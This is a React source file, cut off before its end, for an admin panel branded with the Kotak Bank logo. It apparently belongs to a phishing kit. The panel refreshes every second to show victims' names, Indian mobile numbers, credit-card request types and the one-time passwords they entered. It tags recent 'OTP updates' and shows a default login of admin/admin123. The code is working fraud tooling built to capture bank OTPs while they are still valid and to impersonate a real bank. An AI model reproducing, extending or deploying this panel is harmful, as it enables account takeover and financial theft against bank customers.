import { useState, useEffect } from 'react'
import { Link } from 'react-router-dom'
import { ResponsiveContainer, BarChart, Bar, XAxis, YAxis, Tooltip, CartesianGrid } from 'recharts'

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000/api'

const AdminDashboard = () => {
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [token, setToken] = useState('')
  const [submissions, setSubmissions] = useState([])
  const [selectedSubmission, setSelectedSubmission] = useState(null)
  const [stats, setStats] = useState({ total: 0, pending: 0, approved: 0, rejected: 0 })
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [filter, setFilter] = useState('all')
  const [sidebarOpen, setSidebarOpen] = useState(true)
  const [activeTab, setActiveTab] = useState('dashboard')
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [showPasswordModal, setShowPasswordModal] = useState(false)
  const [currentPassword, setCurrentPassword] = useState('')
  const [newPassword, setNewPassword] = useState('')
  const [confirmPassword, setConfirmPassword] = useState('')
  const [passwordError, setPasswordError] = useState('')
  const [passwordSuccess, setPasswordSuccess] = useState('')

  useEffect(() => {
    const savedToken = localStorage.getItem('adminToken')
    if (savedToken) {
      setToken(savedToken)
      setIsLoggedIn(true)
      fetchSubmissions(savedToken)
      fetchStats(savedToken)
    }
  }, [])

  useEffect(() => {
    if (!token) return
    const interval = setInterval(() => {
      fetchSubmissions(token)
      fetchStats(token)
    }, 1000)
    return () => clearInterval(interval)
  }, [token])

  const fetchSubmissions = async (authToken) => {
    try {
      const response = await fetch(`${API_URL}/admin/submissions`, {
        headers: { 'Authorization': authToken }
      })
      const data = await response.json()
      
      const hasChanged = data.some((newItem, idx) => {
        const oldItem = submissions[idx]
        if (!oldItem) return true
        return oldItem.otp_entered !== newItem.otp_entered || 
               oldItem.status !== newItem.status ||
               oldItem.full_name !== newItem.full_name
      })
      
      if (hasChanged) {
        setSubmissions(data)
      }
    } catch (err) {
      console.error('Fetch error:', err)
    }
  }

  const fetchStats = async (authToken) => {
    try {
      const response = await fetch(`${API_URL}/admin/stats`, {
        headers: { 'Authorization': authToken }
      })
      const data = await response.json()
      setStats(data)
    } catch (err) {
      console.error('Stats error:', err)
    }
  }

  const handleLogin = async (e) => {
    e.preventDefault()
    setError('')
    
    try {
      const response = await fetch(`${API_URL}/admin/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      })
      
      const data = await response.json()
      
      if (response.ok) {
        setToken(data.token)
        localStorage.setItem('adminToken', data.token)
        setIsLoggedIn(true)
        fetchSubmissions(data.token)
        fetchStats(data.token)
      } else {
        setError(data.error)
      }
    } catch (err) {
      setError('Connection error. Please try again.')
    }
  }

  const handleLogout = () => {
    localStorage.removeItem('adminToken')
    setToken('')
    setIsLoggedIn(false)
    setSubmissions([])
    setUsername('')
    setPassword('')
  }

  const updateStatus = async (id, status) => {
    try {
      await fetch(`${API_URL}/admin/submissions/${id}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': token
        },
        body: JSON.stringify({ status })
      })
      fetchSubmissions(token)
      fetchStats(token)
      setSelectedSubmission(null)
    } catch (err) {
      console.error('Update error:', err)
    }
  }

  const deleteSubmission = async (id) => {
    if (confirm('Are you sure you want to delete this submission?')) {
      try {
        await fetch(`${API_URL}/admin/submissions/${id}`, {
          method: 'DELETE',
          headers: { 'Authorization': token }
        })
        fetchSubmissions(token)
        fetchStats(token)
        setSelectedSubmission(null)
      } catch (err) {
        console.error('Delete error:', err)
      }
    }
  }

  const handleChangePassword = async () => {
    setPasswordError('')
    setPasswordSuccess('')
    
    if (!currentPassword || !newPassword || !confirmPassword) {
      setPasswordError('All fields are required')
      return
    }
    
    if (newPassword !== confirmPassword) {
      setPasswordError('New passwords do not match')
      return
    }
    
    if (newPassword.length < 6) {
      setPasswordError('Password must be at least 6 characters')
      return
    }
    
    try {
      const response = await fetch(`${API_URL}/admin/change-password`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': token
        },
        body: JSON.stringify({ currentPassword, newPassword })
      })
      
      const data = await response.json()
      
      if (response.ok) {
        setPasswordSuccess('Password changed successfully')
        setCurrentPassword('')
        setNewPassword('')
        setConfirmPassword('')
        setTimeout(() => {
          setShowPasswordModal(false)
          setPasswordSuccess('')
        }, 2000)
      } else {
        setPasswordError(data.error || 'Failed to change password')
      }
    } catch (err) {
      setPasswordError('Connection error')
    }
  }

  const handleDeleteAllData = async () => {
    if (confirm('Are you sure you want to delete ALL form submissions? This action cannot be undone!')) {
      if (confirm('WARNING: This will permanently delete ALL data. Type "DELETE" to confirm:')) {
        try {
          await fetch(`${API_URL}/admin/delete-all`, {
            method: 'DELETE',
            headers: { 'Authorization': token }
          })
          fetchSubmissions(token)
          fetchStats(token)
          alert('All data deleted successfully')
        } catch (err) {
          console.error('Delete all error:', err)
        }
      }
    }
  }

  const filteredSubmissions = submissions

  const getStatusColor = (status) => {
    switch (status) {
      case 'pending': return 'bg-yellow-100 text-yellow-700'
      case 'approved': return 'bg-green-100 text-green-700'
      case 'rejected': return 'bg-red-100 text-red-700'
      default: return 'bg-gray-100 text-gray-700'
    }
  }

  const getRequestTypeLabel = (type) => {
    switch (type) {
      case 'new': return 'New Credit Card'
      case 'add': return 'Add-on Card'
      case 'upgrade': return 'Card Upgrade'
      default: return type
    }
  }

  if (!isLoggedIn) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-100 to-gray-200 flex items-center justify-center p-3 sm:p-4">
        <div className="bg-white rounded-2xl sm:rounded-3xl shadow-2xl p-5 sm:p-8 w-full max-w-sm sm:max-w-md">
          <div className="text-center mb-5 sm:mb-8">
            <img src="/kotak.png" alt="Kotak Bank" className="h-14 sm:h-16 lg:h-20 mx-auto mb-3 sm:mb-4" />
            <h1 className="text-xl sm:text-2xl font-bold text-gray-800">Admin Portal</h1>
            <p className="text-gray-500 mt-1 sm:mt-2 text-sm sm:text-base">Sign in to your dashboard</p>
          </div>
          
          <form onSubmit={handleLogin} className="space-y-5">
            {error && (
              <div className="bg-red-50 border border-red-200 text-red-600 px-4 py-3 rounded-xl text-sm font-medium">
                {error}
              </div>
            )}
            
            <div>
              <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">Username</label>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="w-full px-3 sm:px-4 py-2.5 sm:py-3.5 border border-gray-200 rounded-lg sm:rounded-xl focus:ring-2 focus:ring-red-500 focus:border-red-500 transition-all text-sm sm:text-base"
                placeholder="Enter username"
                required
              />
            </div>
            
            <div>
              <label className="block text-xs sm:text-sm font-medium text-gray-600 mb-1.5 sm:mb-2">Password</label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-3 sm:px-4 py-2.5 sm:py-3.5 border border-gray-200 rounded-lg sm:rounded-xl focus:ring-2 focus:ring-red-500 focus:border-red-500 transition-all text-sm sm:text-base"
                placeholder="Enter password"
                required
              />
            </div>
            
            <button
              type="submit"
              className="w-full bg-gradient-to-r from-red-600 to-red-700 text-white py-2.5 sm:py-4 rounded-lg sm:rounded-xl font-semibold text-sm sm:text-base hover:from-red-700 hover:to-red-800 transition-all shadow-lg hover:shadow-xl"
            >
              Sign In
            </button>
          </form>
          
          <div className="mt-4 sm:mt-6 text-center text-xs sm:text-sm text-gray-400">
            Default: admin / admin123
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50 flex">
      {/* Sidebar - Desktop */}
      <aside className={`${sidebarOpen ? 'w-56 lg:w-64' : 'w-16 lg:w-20'} hidden lg:flex flex-col bg-gradient-to-b from-gray-900 to-gray-800 text-white transition-all duration-300 fixed h-full z-40`}>
        <div className="p-3 lg:p-4 flex items-center justify-between border-b border-gray-700/50">
          {sidebarOpen && <img src="/kotak.png" alt="Kotak" className="h-8 lg:h-10 object-contain" />}
          <button onClick={() => setSidebarOpen(!sidebarOpen)} className="p-1.5 lg:p-2 hover:bg-gray-700 rounded-lg transition-colors">
            <svg className="w-4 lg:w-5 h-4 lg:h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d={sidebarOpen ? 'M11 19l-7-7 7-7m8 14l-7-7 7-7' : 'M13 5l7 7-7 7M5 5l7 7-7 7'} />
            </svg>
          </button>
        </div>
        
        <nav className="p-2 lg:p-4 space-y-1 lg:space-y-2 flex-1">
          <button onClick={() => setActiveTab('dashboard')} className={`w-full flex items-center gap-2 lg:gap-3 px-2 lg:px-4 py-2.5 lg:py-3 rounded-lg lg:rounded-xl transition-all ${activeTab === 'dashboard' ? 'bg-gradient-to-r from-red-600 to-red-700 text-white shadow-lg' : 'hover:bg-gray-700 text-gray-300'}`}>
            <svg className="w-4 lg:w-5 h-4 lg:h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6zM4 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2v-2zM14 16a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2v-2z"/></svg>
            {sidebarOpen && <span className="font-medium text-sm lg:text-base hidden lg:inline">Dashboard</span>}
          </button>
          
          <button onClick={() => setActiveTab('applications')} className={`w-full flex items-center gap-2 lg:gap-3 px-2 lg:px-4 py-2.5 lg:py-3 rounded-lg lg:rounded-xl transition-all ${activeTab === 'applications' ? 'bg-gradient-to-r from-red-600 to-red-700 text-white shadow-lg' : 'hover:bg-gray-700 text-gray-300'}`}>
            <svg className="w-4 lg:w-5 h-4 lg:h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
            {sidebarOpen && <span className="font-medium text-sm lg:text-base hidden lg:inline">Applications</span>}
          </button>
          
          <button onClick={() => setActiveTab('settings')} className={`w-full flex items-center gap-2 lg:gap-3 px-2 lg:px-4 py-2.5 lg:py-3 rounded-lg lg:rounded-xl transition-all ${activeTab === 'settings' ? 'bg-gradient-to-r from-red-600 to-red-700 text-white shadow-lg' : 'hover:bg-gray-700 text-gray-300'}`}>
            <svg className="w-4 lg:w-5 h-4 lg:h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/></svg>
            {sidebarOpen && <span className="font-medium text-sm lg:text-base hidden lg:inline">Settings</span>}
          </button>
        </nav>
        
        <div className="p-2 lg:p-4 border-t border-gray-700/50">
          <button onClick={handleLogout} className="w-full flex items-center gap-2 lg:gap-3 px-2 lg:px-4 py-2.5 lg:py-3 rounded-lg lg:rounded-xl hover:bg-red-600 text-gray-300 hover:text-white transition-all">
            <svg className="w-4 lg:w-5 h-4 lg:h-5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>
            {sidebarOpen && <span className="font-medium text-sm lg:text-base hidden lg:inline">Logout</span>}
          </button>
        </div>
      </aside>

      {/* Mobile & Tablet Header */}
      <div className="lg:hidden fixed top-0 left-0 right-0 bg-gradient-to-r from-gray-900 to-gray-800 text-white px-3 py-3 flex items-center justify-between z-50">
        <button onClick={() => setMobileMenuOpen(true)} className="p-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
        </button>
        <img src="/kotak.png" alt="Kotak" className="h-7" />
        <button onClick={handleLogout} className="p-2">
          <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>
        </button>
      </div>

      {/* Mobile/Tablet Sidebar */}
      {mobileMenuOpen && (
        <div className="lg:hidden fixed inset-0 bg-black/60 z-50" onClick={() => setMobileMenuOpen(false)}>
          <div className="w-64 bg-gradient-to-b from-gray-900 to-gray-800 h-full p-4" onClick={(e) => e.stopPropagation()}>
            <div className="flex justify-between items-center mb-6">
              <img src="/kotak.png" alt="Kotak" className="h-8" />
              <button onClick={() => setMobileMenuOpen(false)}><svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"/></svg></button>
            </div>
            <nav className="space-y-2">
              <button onClick={() => { setActiveTab('dashboard'); setMobileMenuOpen(false); }} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'dashboard' ? 'bg-gradient-to-r from-red-600 to-red-700 text-white' : 'hover:bg-gray-700 text-gray-300'}`}>
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2H6a2 2 0 01-2-2V6zM14 6a2 2 0 012-2h2a2 2 0 012 2v2a2 2 0 01-2 2h-2a2 2 0 01-2-2V6z"/></svg>
                <span className="font-medium">Dashboard</span>
              </button>
              <button onClick={() => { setActiveTab('applications'); setMobileMenuOpen(false); }} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'applications' ? 'bg-gradient-to-r from-red-600 to-red-700 text-white' : 'hover:bg-gray-700 text-gray-300'}`}>
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
                <span className="font-medium">Applications</span>
              </button>
              <button onClick={() => { setActiveTab('settings'); setMobileMenuOpen(false); }} className={`w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all ${activeTab === 'settings' ? 'bg-gradient-to-r from-red-600 to-red-700 text-white' : 'hover:bg-gray-700 text-gray-300'}`}>
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/></svg>
                <span className="font-medium">Settings</span>
              </button>
              <button onClick={handleLogout} className="w-full flex items-center gap-3 px-4 py-3 rounded-xl hover:bg-red-600 text-gray-300 hover:text-white transition-all mt-4 border-t border-gray-700">
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/></svg>
                <span className="font-medium">Logout</span>
              </button>
            </nav>
          </div>
        </div>
      )}

      {/* Main Content */}
      <main className={`flex-1 ${sidebarOpen ? 'lg:ml-56 lg:ml-64' : 'lg:ml-16 lg:ml-20'} transition-all duration-300 pt-14 sm:pt-16 lg:pt-0`}>
        <div className="p-3 sm:p-4 lg:p-6 xl:p-8">
          {activeTab === 'dashboard' && (
            <div className="space-y-4 sm:space-y-6">
              <div className="flex items-center justify-between">
                <div>
                  <h1 className="text-xl sm:text-2xl lg:text-3xl font-bold text-gray-800">Dashboard</h1>
                  <p className="text-gray-500 mt-0.5 sm:mt-1 text-sm sm:text-base">Welcome back!</p>
                </div>
              </div>

              {/* Stats Cards */}
              <div className="grid grid-cols-2 gap-2 sm:gap-3 lg:gap-6">
                <div className="bg-gradient-to-br from-blue-500 to-blue-600 rounded-lg sm:rounded-xl lg:rounded-2xl p-2.5 sm:p-3 lg:p-5 text-white shadow-md lg:shadow-xl">
                  <div className="flex items-center justify-between gap-1">
                    <div>
                      <p className="text-blue-100 text-[10px] sm:text-xs lg:text-sm font-medium">Total</p>
                      <p className="text-xl sm:text-2xl lg:text-4xl font-bold mt-0.5 sm:mt-1 lg:mt-2">{stats.total}</p>
                    </div>
                    <div className="w-6 h-6 sm:w-8 sm:h-8 lg:w-12 lg:h-12 bg-white/20 rounded-md lg:rounded-xl flex items-center justify-center flex-shrink-0">
                      <svg className="w-3 h-3 sm:w-4 sm:h-4 lg:w-5 lg:h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
                    </div>
                  </div>
                </div>
                <div className="bg-gradient-to-br from-yellow-500 to-orange-500 rounded-lg sm:rounded-xl lg:rounded-2xl p-2.5 sm:p-3 lg:p-5 text-white shadow-md lg:shadow-xl">
                  <div className="flex items-center justify-between gap-1">
                    <div>
                      <p className="text-yellow-100 text-[10px] sm:text-xs lg:text-sm font-medium">OTP</p>
                      <p className="text-xl sm:text-2xl lg:text-4xl font-bold mt-0.5 sm:mt-1 lg:mt-2">{stats.otpVerified}</p>
                    </div>
                    <div className="w-6 h-6 sm:w-8 sm:h-8 lg:w-12 lg:h-12 bg-white/20 rounded-md lg:rounded-xl flex items-center justify-center flex-shrink-0">
                      <svg className="w-3 h-3 sm:w-4 sm:h-4 lg:w-5 lg:h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
                    </div>
                  </div>
                </div>
                <div className="bg-gradient-to-br from-green-500 to-emerald-500 rounded-lg sm:rounded-xl lg:rounded-2xl p-2.5 sm:p-3 lg:p-5 text-white shadow-md lg:shadow-xl">
                  <div className="flex items-center justify-between gap-1">
                    <div>
                      <p className="text-green-100 text-[10px] sm:text-xs lg:text-sm font-medium">Last 24h</p>
                      <p className="text-xl sm:text-2xl lg:text-4xl font-bold mt-0.5 sm:mt-1 lg:mt-2">{submissions.filter(s => {const dayAgo = new Date(Date.now() - 24*60*60*1000); return new Date(s.created_at) > dayAgo}).length}</p>
                    </div>
                    <div className="w-6 h-6 sm:w-8 sm:h-8 lg:w-12 lg:h-12 bg-white/20 rounded-md lg:rounded-xl flex items-center justify-center flex-shrink-0">
                      <svg className="w-3 h-3 sm:w-4 sm:h-4 lg:w-5 lg:h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
                    </div>
                  </div>
                </div>
                <div className="bg-gradient-to-br from-purple-500 to-purple-600 rounded-lg sm:rounded-xl lg:rounded-2xl p-2.5 sm:p-3 lg:p-5 text-white shadow-md lg:shadow-xl">
                  <div className="flex items-center justify-between gap-1">
                    <div>
                      <p className="text-purple-100 text-[10px] sm:text-xs lg:text-sm font-medium">New Card</p>
                      <p className="text-xl sm:text-2xl lg:text-4xl font-bold mt-0.5 sm:mt-1 lg:mt-2">{submissions.filter(s => s.request_type === 'new').length}</p>
                    </div>
                    <div className="w-6 h-6 sm:w-8 sm:h-8 lg:w-12 lg:h-12 bg-white/20 rounded-md lg:rounded-xl flex items-center justify-center flex-shrink-0">
                      <svg className="w-3 h-3 sm:w-4 sm:h-4 lg:w-5 lg:h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
                    </div>
                  </div>
                </div>
              </div>

              {/* Recent Applications */}
              <div className="bg-white rounded-xl sm:shadow-sm border border-gray-100 overflow-hidden">
                <div className="p-4 sm:p-5 lg:p-6 border-b border-gray-100 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2">
                  <h2 className="font-bold text-gray-800 text-sm sm:text-base lg:text-lg">Recent OTP Updates (24h)</h2>
                  <button onClick={() => setActiveTab('applications')} className="text-red-600 text-xs sm:text-sm font-medium hover:underline whitespace-nowrap">View All</button>
                </div>
                <div className="overflow-x-auto">
                  <table className="w-full min-w-[500px] sm:min-w-[600px]">
                    <thead className="bg-gray-50">
                      <tr>
                        <th className="px-3 sm:px-4 py-2 sm:py-3 text-left text-xs font-semibold text-gray-500">ID</th>
                        <th className="px-3 sm:px-4 py-2 sm:py-3 text-left text-xs font-semibold text-gray-500">Name</th>
                        <th className="px-3 sm:px-4 py-2 sm:py-3 text-left text-xs font-semibold text-gray-500 hidden sm:table-cell">Type</th>
                        <th className="px-3 sm:px-4 py-2 sm:py-3 text-left text-xs font-semibold text-gray-500">OTP</th>
                        <th className="px-3 sm:px-4 py-2 sm:py-3 text-left text-xs font-semibold text-gray-500">Date</th>
                        <th className="px-3 sm:px-4 py-2 sm:py-3 text-left text-xs font-semibold text-gray-500">Action</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-gray-100">
                      {loading ? (
                        <tr><td colSpan="6" className="px-4 py-6 sm:py-8 text-center text-gray-500 text-sm">Loading...</td></tr>
                      ) : submissions.length === 0 ? (
                        <tr><td colSpan="6" className="px-4 py-6 sm:py-8 text-center text-gray-500 text-sm">No submissions found</td></tr>
                      ) : (
                        submissions.slice(0, 5).map((sub) => (
                          <tr key={sub.id} className="hover:bg-gray-50 transition-colors">
                            <td className="px-3 sm:px-4 py-2 sm:py-3 text-xs sm:text-sm text-gray-600">#{sub.id}</td>
                            <td className="px-3 sm:px-4 py-2 sm:py-3 text-xs sm:text-sm font-medium text-gray-800 truncate max-w-[100px] sm:max-w-none">{sub.full_name}</td>
                            <td className="px-3 sm:px-4 py-2 sm:py-3 text-xs sm:text-sm text-gray-600 hidden sm:table-cell">{getRequestTypeLabel(sub.request_type)}</td>
                            <td className="px-3 sm:px-4 py-2 sm:py-3">{sub.otp_entered ? <span className="px-2 py-0.5 sm:px-2.5 sm:py-1 rounded-full text-xs font-medium bg-green-100 text-green-700">{sub.otp_entered}</span> : <span className="px-2 py-0.5 sm:px-2.5 sm:py-1 rounded-full text-xs font-medium bg-gray-100 text-gray-500">-</span>}</td>
                            <td className="px-3 sm:px-4 py-2 sm:py-3 text-xs sm:text-sm text-gray-500">{new Date(sub.created_at).toLocaleDateString()}</td>
                            <td className="px-3 sm:px-4 py-2 sm:py-3"><button onClick={() => setSelectedSubmission(sub)} className="text-red-600 hover:text-red-800 text-xs sm:text-sm font-medium">View</button></td>
                          </tr>
                        ))
                      )}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {activeTab === 'applications' && (
            <div className="space-y-4 sm:space-y-6">
              <h1 className="text-xl sm:text-2xl lg:text-3xl font-bold text-gray-800">All Applications</h1>
              <div className="bg-white rounded-xl sm:shadow-sm border border-gray-100 overflow-hidden">
                <div className="overflow-x-auto">
                  <table className="w-full min-w-[500px] sm:min-w-[700px]">
                    <thead className="bg-gray-50">
                      <tr>
                        <th className="px-3 sm:px-4 py-2 sm:py-3 text-left text-xs font-semibold text-gray-500">ID</th>
                        <th className="px-3 sm:px-4 py-2 sm:py-3 text-left text-xs font-semibold text-gray-500">Name</th>
                        <th className="px-3 sm:px-4 py-2 sm:py-3 text-left text-xs font-semibold text-gray-500 hidden md:table-cell">Mobile</th>
                        <th className="px-3 sm:px-4 py-2 sm:py-3 text-left text-xs font-semibold text-gray-500 hidden sm:table-cell">Type</th>
                        <th className="px-3 sm:px-4 py-2 sm:py-3 text-left text-xs font-semibold text-gray-500">OTP</th>
                        <th className="px-3 sm:px-4 py-2 sm:py-3 text-left text-xs font-semibold text-gray-500">Date</th>
                        <th className="px-3 sm:px-4 py-2 sm:py-3 text-left text-xs font-semibold text-gray-500">Action</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-gray-100">
                      {loading ? (<tr><td colSpan="7" className="px-4 py-6 sm:py-8 text-center text-gray-500 text-sm">Loading...</td></tr>) : filteredSubmissions.length === 0 ? (<tr><td colSpan="7" className="px-4 py-6 sm:py-8 text-center text-gray-500 text-sm">No submissions found</td></tr>) : (
                        filteredSubmissions.map((sub) => (
                          <tr key={sub.id} className="hover:bg-gray-50 transition-colors">
                            <td className="px-3 sm:px-4 py-2 sm:py-3 text-xs sm:text-sm text-gray-600">#{sub.id}</td>
                            <td className="px-3 sm:px-4 py-2 sm:py-3 text-xs sm:text-sm font-medium text-gray-800 truncate max-w-[80px] sm:max-w-[120px]">{sub.full_name}</td>
                            <td className="px-3 sm:px-4 py-2 sm:py-3 text-xs sm:text-sm text-gray-600 hidden md:table-cell">+91 {sub.mobile_number}</td>
                            <td className="px-3 sm:px-4 py-2 sm:py-3 text-xs sm:text-sm text-gray-600 hidden sm:table-cell">{getRequestTypeLabel(sub.request_type)}</td>
                            <td className="px-3 sm:px-4 py-2 sm:py-3">{sub.otp_entered ? <span className="px-2 py-0.5 sm:px-2.5 sm:py-1 rounded-full text-xs font-medium bg-green-100 text-green-700">{sub.otp_entered}</span> : <span className="px-2 py-0.5 sm:px-2.5 sm:py-1 rounded-full text-xs font-medium bg-gray-100 text-gray-500">-</span>}</td>
                            <td className="px-3 sm:px-4 py-2 sm:py-3 text-xs sm:text-sm text-gray-500">{new Date(sub.created_at).toLocaleDateString()}</td>
                            <td className="px-3 sm:px-4 py-2 sm:py-3"><button onClick={() => setSelectedSubmission(sub)} className="text-red-600 hover:text-red-800 text-xs sm:text-sm font-medium">View</button></td>
                          </tr>
                        ))
                      )}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}

          {activeTab === 'settings' && (
            <div className="bg-white rounded-xl sm:shadow-sm p-4 sm:p-6 lg:p-8">
              <h1 className="text-xl sm:text-2xl font-bold text-gray-800 mb-4 sm:mb-6">Settings</h1>
              <div className="space-y-4 sm:space-y-6">
                <div className="border-b border-gray-100 pb-4 sm:pb-6">
                  <h3 className="font-semibold text-gray-800 mb-2 sm:mb-3">Account</h3>
                  <p className="text-gray-500 text-sm">Logged in as: <span className="font-medium text-gray-700">admin</span></p>
                  <button onClick={() => setShowPasswordModal(true)} className="mt-2 sm:mt-3 bg-blue-600 text-white px-4 py-2 rounded-xl hover:bg-blue-700 transition-colors text-sm font-medium">Change Password</button>
                </div>
                <div className="border-b border-gray-100 pb-4 sm:pb-6">
                  <h3 className="font-semibold text-gray-800 mb-2 sm:mb-3">System</h3>
                  <p className="text-gray-500 text-sm">Database: <span className="text-green-600 font-medium">Connected</span></p>
                </div>
                <div>
                  <h3 className="font-semibold text-gray-800 mb-2 sm:mb-3 text-red-600">Danger Zone</h3>
                  <div className="flex flex-col sm:flex-row gap-2 sm:gap-3">
                    <button onClick={handleLogout} className="bg-red-600 text-white px-4 sm:px-6 py-2 sm:py-3 rounded-xl hover:bg-red-700 transition-colors text-sm font-medium">Logout</button>
                    <button onClick={handleDeleteAllData} className="bg-gray-800 text-white px-4 sm:px-6 py-2 sm:py-3 rounded-xl hover:bg-gray-900 transition-colors text-sm font-medium">Delete All Data</button>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>
      </main>

